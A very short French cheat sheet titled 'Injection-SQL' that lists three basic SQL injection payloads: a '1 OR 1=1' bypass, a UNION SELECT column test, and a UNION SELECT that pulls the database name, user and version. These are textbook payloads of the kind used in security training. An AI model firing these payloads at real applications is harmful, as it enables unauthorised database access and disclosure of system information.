# Injection-SQL

Les différentes injections :
- Bypass simple :	1 OR 1=1
- Test des colonnes :	-1 UNION SELECT 1,2,3,4,5
- Extraction d'infos du système : -1 UNION SELECT 1, database(), user(), version(), 5
